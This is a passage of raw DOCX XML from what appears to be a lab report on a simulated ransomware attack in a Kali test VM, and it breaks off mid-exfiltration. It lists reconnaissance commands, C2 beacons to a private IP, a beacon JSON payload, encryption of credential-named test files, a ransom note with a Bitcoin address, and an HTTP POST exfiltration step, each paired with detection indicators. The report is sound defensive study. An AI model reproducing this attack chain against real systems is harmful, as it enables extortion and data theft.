          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>Timelin</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="5A3C29D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Pr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1C7ACBE2" wp14:editId="2DEC67CE">
            <wp:extent cx="5940425" cy="250444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504440"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="511D0D18"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Total Events:</w:t>
      </w:r>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve"> 21</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Detection Rate:</w:t>
      </w:r>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve"> 100%</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="628C2736"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 xml:space="preserve">4.2 </w:t>
      </w:r>
      <w:r w:rsidRPr="000F5056">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>Phase Analysis</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35C9261F"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Phase 1: Reconnaissance (6 events)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00C8557F"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Objective:</w:t>
      </w:r>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve"> Gather system information for optimal attack execution</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2084A1A3"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Commands Executed:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B399C0C" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324A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KZ"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>whoami</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve"> - Current user identification</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C242F53" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324A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Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>id</w:t>
      </w:r>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve"> - Privilege level verification</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63382C66" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324A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KZ"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>uname</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve"> -a</w:t>
      </w:r>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve"> - OS and kernel information</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D0C31CF" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324A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Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>ls -la /home/kali</w:t>
      </w:r>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve"> - Home directory contents</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57DFD82B" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324A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KZ"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>ps</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve"> aux</w:t>
      </w:r>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve"> - Running processes enumeration</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4174E12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Detection Indicators:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BEDA454" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324AC">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Rapid sequential execution of enumeration commands</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26C5EF3A" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324AC">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Suspicious process activity pattern</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12774D34" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324AC">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Non-interactive command execution</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05D98229"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Risk Assessment:</w:t>
      </w:r>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve"> These commands are typical initial reconnaissance activities seen in APT and ransomware attacks.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04631034"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lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="61572758" wp14:editId="678D4F2E">
            <wp:extent cx="5940425" cy="442214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422140"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="67713BEF"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3929AA">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>Figure 4.1: Reconnaissance phase - 5 enumeration commands detected</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E151DA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p>
    <w:p w14:paraId="0B1EB994"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Phase 2: C2 Communication (3 events, 0.5 seconds)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34C221A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Objective:</w:t>
      </w:r>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve"> Establish contact with attacker command-and-control infrastructure</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1691068A"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Network Activity:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54B4A8EF" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324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Beacon to 192.168.100.20:31337 (failed)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31C1B9A2" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324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Beacon to 192.168.100.20:8888 (failed)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FFB4966" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324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JSON payload with victim identification</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="163BCE2F"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C2 Payload Structure:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F61ABEE"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="310D8E8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spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>victim</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>_id</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>": "20251215_201412",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70225677"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"hostname": "kali",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="705C099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spellStart"/>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>os</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>": "Linux",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15E9CBF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"timestamp": "2025-12-15T20:14:17"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4541926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lastRenderedPageBreak/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F9B2A13"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Detection Indicators:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EAA09DE" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324AC">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Connections to non-standard ports (31337, 8888)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C498A4D" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324AC">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Suspicious port numbers (often used by malware)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C4B812B" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324AC">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Outbound connections from unexpected processes</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47A71641"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Risk Assessment:</w:t>
      </w:r>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve"> C2 communication is a hallmark of advanced malware. Even failed attempts indicate compromise.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="700D87F6"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drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="33238D59" wp14:editId="75F26FE9">
            <wp:extent cx="5940425" cy="44424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442460"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="5225EC17" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="003929AA" w:rsidRDefault="00C324AC" w:rsidP="00C324AC">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:outlineLvl w:val="3"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003929AA">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>Figure 4.2: C2 communication attempts to ports 31337 and 8888</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13DF14C9"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Phase 3: Encryption (9 events, 2.5 seconds)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="702D221B"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Objective:</w:t>
      </w:r>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve"> Encrypt valuable files and deploy ransom demand</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E8263C4"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Encryption Details:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B3A16B8" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324AC">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Algorithm:</w:t>
      </w:r>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve"> Fernet (AES-128 in CBC mode)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E865361" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324AC">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lastRenderedPageBreak/>
        <w:t>Key Storage:</w:t>
      </w:r>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>/home/kali/test/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>decrypt_key.key</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="42399577" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324AC">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Files Encrypted:</w:t>
      </w:r>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve"> 6 files totaling 2,580 bytes</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3627DF48"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Targeted Files:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32AD99F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passwords.txt (42 bytes → 440 bytes encrypted)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48F82CD0"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backup_keys.txt (32 bytes → 440 bytes encrypted)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73DBF51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contract.doc (39 bytes → 440 bytes encrypted)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5857334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roofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>private.key</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve"> (28 bytes → 420 bytes encrypted)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2457DBD4"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financial_report.pdf (40 bytes → 440 bytes encrypted)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59991919"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employees.csv (35 bytes → 440 bytes encrypted)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6164C00D"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File Selection Logic:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7128A91B" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324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Credentials (passwords, keys)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FEC70B6" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324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Business documents (contracts, reports)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CACD25A" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324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Sensitive data (employee information)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D0EB78A"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Ransom Note Content:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78A3F1E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Segoe UI Emoji" w:eastAsia="Times New Roman" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>⚠️</w:t>
      </w:r>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve"> YOUR FILES HAVE BEEN ENCRYPTED </w:t>
      </w:r>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Emoji" w:eastAsia="Times New Roman" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>⚠️</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4483799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Attack ID: 20251215_201412</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02DD6876"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Encrypted at: 2025-12-15 20:14:21</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02FD23F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4459EEA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To decrypt your files, send 1 BTC to:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4924B242"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bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FD7786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2831D20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Segoe UI Emoji" w:eastAsia="Times New Roman" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>⚠️</w:t>
      </w:r>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve"> THIS IS A SIMULATION FOR EDUCATIONAL PURPOSES </w:t>
      </w:r>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Emoji" w:eastAsia="Times New Roman" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>⚠️</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A52C6D0"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Detection Indicators:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74A1C77E" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324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Mass file modifications in short timeframe</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D6F13DF" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324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File size changes (encryption overhead)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="295A4FD1" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324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Creation of ransom note file</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08B4DDDF" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324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Suspicious file I/O patterns</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DB0586E"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Risk Assessment:</w:t>
      </w:r>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve"> This represents the destructive phase where data becomes inaccessible to legitimate users.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="113D3214"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lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="70BC4304" wp14:editId="0163D696">
            <wp:extent cx="5940425" cy="451866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518660"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="73B6F2FE"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3929AA">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>Figure 4.3: Encryption phase - 6 files encrypted with size changes</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C94F049"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Phase 4: Data Exfiltration (3 events, 1 second)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08D2FDA9"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Objective:</w:t>
      </w:r>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve"> Steal encrypted data before deletion (double extortion tactic)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2159E768"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Exfiltration Attempt:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="110F3E4D" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324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Target: 192.168.100.20:8080</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10D5C852" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324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Method: HTTP POST request</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7472BC0A" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324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Payload: Encrypted file metadata and key sample</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70A4CC0F" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324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Result: </w:t>
      </w:r>
      <w:r w:rsidRPr="00BD172D">
